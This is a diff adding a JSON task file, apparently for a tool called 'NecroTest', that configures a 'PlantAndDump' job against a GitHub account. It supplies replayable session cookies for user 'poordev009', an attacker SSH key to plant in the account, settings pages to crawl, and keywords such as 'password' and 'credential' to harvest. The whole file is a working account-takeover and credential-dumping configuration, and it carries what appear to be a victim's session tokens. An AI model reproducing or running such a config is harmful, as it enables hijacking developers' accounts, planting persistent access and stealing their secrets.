@@ -1,0 +1,137 @@
+{
+  "name": "NecroTest",
+  "task": {
+    "type": "github",
+    "name": "PlantAndDump",
+    "params": {
+      "fixSession": "https://github.com/settings/profile",
+      "urls": [
+        "https://github.com/settings/profile",
+        "https://github.com/settings/security-log",
+        "https://github.com/settings/emails",
+        "https://github.com/settings/repositories"
+      ],
+      "keywords": ["password", "certificate","vpn","credential","login","https://","access","portal"],
+      "sshKey": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMO7NOIMjlEcVnKYlZbutGa0a89G/tgsiJAEC0pzxSuA key@necro"
+    }
+  },
+  "cookies":
+  [
+    {
+      "name":"logged_in",
+      "value":"yes",
+      "domain":"github.com",
+      "expirationDate":1636623804,
+      "path":"/",
+      "httpOnly":true,
+      "secure":true,
+      "session":false,
+      "hostOnly":false,
+      "sameSite":"lax"
+
+    },
+    {
+      "name":"_device_id",
+      "value":"766519ae0a459e83e640dfb1efe25f3b",
+      "domain":"github.com",
+      "expirationDate":1636623813,
+      "path":"/",
+      "httpOnly":true,
+      "secure":true,
+      "session":false,
+      "sameSite":"lax"
+
+    },
+    {
+      "name":"dotcom_user",
+      "value":"poordev009",
+      "domain":".github.com",
+      "expirationDate":1636623813,
+      "path":"/",
+      "httpOnly":true,
+      "secure":true,
+      "hostOnly":false,
+      "session":false,
+      "sameSite":"lax"
+
+    },
+    {
+      "name":"_gh_sess",
+      "value":"Xn70S1mYfioETtbbpwLRmzMVkG6cc1avzP8rFER4uT%2FRxGX%2Bvra8Blk9IKii3wOZih9bWRwPJavgja4Z%2FWupmgHenaxg6CtZ2c3M79YTUAEGSWzHi4laYOe8oN3aIyj7dSa7fQ6M5R1mW42L1Hr0q3qQnRfx3nQRFKZYSPZ%2BdgK6eUr7H16WATpknarYC%2F14OlueK0isKR4LxaspPuSq%2BLLjBvBsRvRBEbUg95HdlIIi0mYJxE1TeoEf5raGKq67ilzuOSP75bfn74nliIOQ6%2B0mlD4VsSjhmTRnyeAo%2BvhVdUqvjtOeKJmhiNfW9Nr4TNO8fUakDlSFgxefPzHz5efXNU5BYaNjqyNyNfDXCzL%2BjqDLqRmAgAqBqL%2Bv%2B5gGQ6PRtAnvv6wrlu563RGPvitzZ0dx45YAEKyX8sj5r%2FmUjgkL3KqWAVy1vJrJUvQlYT%2BewkbWKrklyzPhekgRAyoID0lmvDAT7SiQxLAzXl4tRydne8Pk0K65MvtTtDIdgw52Oj2YCJ46rWYlZGRsVCKPyV6mw7h3cHFfIS4%2B0odOIVNnhPj2KizTBOA96vkkH5Rjgs0vLsJND87zmUpct322VV%2Blu%2BKmR0OapE%2BNh7t3hUiLjzTdttVUmw3zATqzWGJV74SNoNzkhYaGU2dT5aQwTp%2FiG%2Bz%2FfZDO3Nj2P9T%2FuCcO8xo%2BWb%2B1qV%2Fp1jzIRRbXjTN0%2FfTt3jqrPfEgpMxAOCzKpcjCpME8rys%2BJIa5vL6Ey4wNcWIkRk74dt2jOUoG9T%2F3xbr80FbVZFUnEy%2BioIXvKdNL5V%2FMs5iLk2KCbspu4iDxfo%2BcPAtOnYyO%2FK6fLhFjOZFl%2F4UwLG78f82YJzglS%2Bhh52BupDBwv%2FvII5u9IubFt%2BFSRnfpSvZx3suefTii74hi1RQvHMyO%2F8X8R7JLvDDO--Do1Oetl3t8Mtwapc--vgYE5WvL2gr7OEszkQW6Nw%3D%3D",
+      "domain":"github.com",
+      "path":"/",
+      "httpOnly":true,
+      "secure":true,
+      "session":true,
+      "hostOnly":true,
+      "sameSite":"lax"
+    },
+    {
+      "name":"has_recent_activity",
+      "value":"1",
+      "domain":"github.com",
+      "expirationDate":1605091414,
+      "path":"/",
+      "httpOnly":true,
+      "secure":true,
+      "hostOnly":false,
+      "session":false,
+      "sameSite":"lax"
+
+    },
+    {
+      "name":"user_session",
+      "value":"YPeAWNGRhmQM5B6-zSNfK7ssipXOJuvyiOOoKnC2wlaN3U0k",
+      "domain":"github.com",
+      "expirationDate":1606297414,
+      "path":"/",
+      "httpOnly":true,
+      "secure":true,
+      "hostOnly":false,
+      "session":false,
+      "sameSite":"lax"
+
+    },
+    {
+      "name":"__Host-user_session_same_site",
+      "value":"YPeAWNGRhmQM5B6-zSNfK7ssipXOJuvyiOOoKnC2wlaN3U0k",
+      "domain":"github.com",
+      "expirationDate":1606297414,
+      "path":"/",
+      "httpOnly":true,
+      "secure":true,
+      "hostOnly":false,
+      "session":false,
+      "sameSite":"lax"
+
+    },
+    {
+      "name":"logged_in",
+      "value":"yes",
+      "domain":".github.com",
+      "expirationDate":1636623813,
+      "path":"/",
+      "httpOnly":true,
+      "secure":true,
+      "hostOnly":false,
+      "session":false,
+      "sameSite":"lax"
+
+    },
+    {
+      "name":"_octo",
+      "value":"GH1.1.610339849.1605087804",
+      "domain":"github.com",
+      "expirationDate":1636623804,
+      "path":"/",
+      "httpOnly":false,
+      "secure":true,
+      "hostOnly":false,
+
+      "session":false,
+      "sameSite":"lax"
+
+    }
+  ]
+
+}
